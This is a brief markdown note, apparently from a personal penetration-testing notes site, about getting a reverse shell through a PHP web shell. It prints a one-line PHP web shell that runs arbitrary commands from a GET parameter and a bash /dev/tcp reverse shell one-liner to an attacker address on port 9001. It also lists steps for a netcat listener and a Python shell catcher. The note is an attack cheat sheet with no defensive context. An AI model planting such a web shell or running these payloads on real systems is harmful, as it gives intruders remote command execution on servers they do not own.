+++
title = 'Reverse web-shell'
date = 2024-07-22T09:10:24+02:00
draft = false
+++

    ## Reverse shell 

- By passing the php  file we can open the reverse shell 


```php 
<?php system($_GET["cmd"]);?>
```
1. Checkout [reverse shell](https://www.revshells.com/)
2. Use dev tcp to open the shell since [[netcat]] is not avaiable 
	1. ex *sh -i >& /dev/tcp/10.10.10.10/9001 0>&1*
3. Create the listner with the [[netcat]]
4. Create a **python server** that catches the shell and enables interactivity


>[!quote]  [bash_MAIN]({{< ref "posts/Linux/commands/bash_MAIN.md" >}})